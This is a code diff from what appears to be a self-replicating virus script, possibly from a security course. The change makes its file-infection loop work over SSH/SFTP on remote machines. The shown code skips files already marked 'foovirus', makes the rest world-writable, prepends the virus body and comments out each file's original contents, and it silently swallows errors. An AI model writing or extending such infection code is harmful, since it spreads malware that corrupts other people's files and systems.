@@ -116,18 +116,20 @@ while True:
                     virus = [line for (i,line) in enumerate(IN) if i < 37]
 
                     for item in file_list:
-                        print(f"Attacking {item}")
-                        IN = open(item, 'r')
+                        # print(f"Attacking {item}")
+                        sftp = ssh.open_sftp()
+                        IN = sftp.file(item, 'r')
+                        # Read the contents of the remote file
                         all_of_it = IN.readlines()
                         IN.close()
-                        print(all_of_it)
                         if any('foovirus' in line for line in all_of_it): continue
                         os.chmod(item, 0o777)
-                        OUT = open(item, 'w')
+                        OUT = sftp.file(item, 'w')
                         OUT.writelines(virus)
                         all_of_it = ['#' + line for line in all_of_it]
                         OUT.writelines(all_of_it)
-                        OUT.close()                               
+                        OUT.close()
+                        sftp.close()                               
                 except:
                     continue
                 
